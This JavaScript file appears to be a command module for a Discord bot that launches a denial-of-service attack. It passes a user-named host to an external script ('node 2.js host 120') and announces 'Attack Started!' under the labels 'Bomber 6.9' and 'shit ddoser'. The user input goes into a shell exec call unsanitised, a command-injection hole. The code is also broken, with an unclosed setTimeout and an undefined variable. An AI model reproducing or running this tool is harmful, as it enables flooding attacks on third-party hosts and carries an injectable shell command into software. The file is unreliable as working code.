const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Error')
	.setDescription("`Error`")
	message.channel.send(embed1);
	return;
	}


	
  
var exec = require('child_process').exec
exec(`node 2.js ${host} 120`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack Started By: ' +  message.guild.id)



const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 Bomber 6.9 🔥')
	.setTimestamp()
	.setDescription("`Attack Started!`")
	.setFooter('shit ddoser', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['js2'],
  permLevel: 0
}

exports.help = {
  name: 'js2',
  description: 'Özel',
  usage: 'js2'
}